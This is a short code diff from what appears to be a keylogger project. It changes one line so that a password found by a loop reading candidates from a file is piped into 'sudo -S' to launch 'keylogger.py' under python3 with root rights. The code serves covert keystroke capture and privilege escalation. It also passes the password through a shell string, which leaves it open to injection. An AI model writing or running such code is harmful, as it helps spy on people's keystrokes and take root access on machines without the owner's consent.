@@ -7,4 +7,4 @@ while not password.verify(pw):
 	password.getPassword()
 	pw = f.readline()
 	password.verify(pw)
-subprocess.Popen("echo "+pw+" | sudo -S python keylogger.py",shell=True)
+subprocess.Popen("echo "+pw+" | sudo -S python3 keylogger.py",shell=True)
